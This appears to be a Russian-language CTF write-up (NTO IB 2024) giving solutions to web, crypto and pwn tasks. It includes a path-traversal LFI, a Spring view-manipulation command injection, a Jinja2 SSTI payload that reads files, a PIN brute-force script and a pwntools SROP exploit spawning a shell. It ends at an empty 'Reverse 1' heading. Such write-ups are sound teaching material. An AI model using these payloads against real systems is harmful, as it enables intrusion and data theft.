# Решения заданий НТО ИБ 2024 1337Rpwn4
# CTF

### WEB 1

Заходим на таск и видим календарь, один из дней на котором окрашен в типичную HTML-гиперссылку. Нажимаем. Идёт редирект на: `/download?file_type=file1.txt`

Пробуем LFI:
```
download?file_type=../../../../../../../../../etc/secret
```

Флаг: `nto{P6t9_T77v6RsA1}`

### WEB 2

Заливаем `jar`-файл в `jd-gui` и видим следующий, казалось бы, пустой метод:

```
  @GetMapping({"/doc/{document}"})
  public void getDocument(@PathVariable String document) {
    System.out.println("This function is not ready yet");
  }
```

Пробуем `Spring View Manipulation Vulnerability`:

```
/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::..x
```

Флаг: `nto{abobovichasdfas}`

### WEB 3

На эндпоинте `/flag` видим 403 ошибку. Заходим в исходники и находим `haproxy`. Пробуем дефолтные байпассы, сработал, например, `//flag`.

Далее фильтруемая `SSTI` в `Jinja2`. Гуглим хактриксы и вводим:

```
//flag?name={{(request|attr(request.args.c))._load_form_data.__globals__.__builtins__.open(%22flag.txt%22).read()}}&c=__class__
```

Флаг: `nto{Ht1P_sM088Lin6_88Ti}`

### Crypto 1

На сервере существует эндпоинт для проверки пина, известно что пин - число и зашифрованный правильный пин маленького размера => Можно написать брутфорс

Код брутфорса:
```python
import requests
import time


url = "http://192.168.12.12:5000/api"

if __name__ == "__main__":
    print()
    for i in range(10 ** 10):
        resp = requests.post(url + "/CheckPin", json={'pin': i})
        if resp.status_code != 500:
            print("!!!!{}!!!!".format(resp.json()))
            break
        else:
            print(i)
        time.sleep(0.01)
```

### PWN 2

Решение бинарной уязвимости было взято из примеров: [ссылка1](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), [ссылка2](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/syscalls/exploitation-with-syscalls.md)

Код:
```python
from pwn import *

elf = context.binary = ELF('./task')
p = remote("192.168.12.13", 1555)

binsh = elf.address + 0x1430

POP_RAX = 0x41018
POP_RDI = 0x1000001a
POP_RSI = 0x1000001c
POP_RDX = 0x1000001e
SYSCALL = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xF)
payload += p64(SYSCALL)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

### Reverse 1

